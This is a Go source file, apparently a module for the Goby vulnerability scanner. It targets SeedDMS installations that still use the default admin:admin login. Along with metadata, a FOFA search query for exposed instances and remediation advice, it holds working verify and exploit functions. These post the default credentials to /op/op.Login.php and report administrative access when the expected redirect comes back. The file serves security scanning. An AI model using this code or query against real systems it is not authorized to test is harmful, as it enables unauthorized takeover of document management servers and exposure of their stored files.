package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SeedDMS op.Login.php file Dafult Password Vulnerability",
    "Description": "<p>SeedDMS is a free document management system with an easy to use web based user interface for small and medium sized enterprises.Attacker can use the vulnerability to get administrative authority</p>",
    "Impact": "<p>SeedDMS Dafult Password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "SeedDMS",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "SeedDMS 文档管理系统 op.Login.php 文件默认口令漏洞",
            "Product": "SeedDMS",
            "Description": "<p>SeedDMS是一个免费的文档管理系统，易于使用基于Web的基于Web的中小型企业的用户界面。</p><p>SeedDMS存在默认口令漏洞。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>SeedDMS是一个免费的文档管理系统，易于使用基于Web的基于Web的中小型企业的用户界面。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "SeedDMS op.Login.php file Dafult Password Vulnerability",
            "Product": "SeedDMS",
            "Description": "<p>SeedDMS is a free document management system with an easy to use web based user interface for small and medium sized enterprises.Attacker can use the vulnerability to get administrative authority</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>SeedDMS Dafult Password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"SeedDMS\"",
    "GobyQuery": "body=\"SeedDMS\"",
    "Author": "AnMing",
    "Homepage": "https://www.seeddms.org/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://www.seeddms.org/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/op/op.Login.php"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.Header.Store("Origin", u.FixedHostInfo)
			cfg.Data = "login=admin&pwd=admin&lang="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Header.Get("Location"), "/out/out.ViewFolder.php") && resp.StatusCode == 302 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/op/op.Login.php"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Origin", expResult.HostInfo.FixedHostInfo)
			cfg.Data = "login=admin&pwd=admin&lang="
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Header.Get("Location"), "/out/out.ViewFolder.php") && resp.StatusCode == 302 {
					expResult.Success = true
					expResult.Output = "Plase use \"admin:admin\" to login!"
				}
			}
			return expResult
		},
	))
}
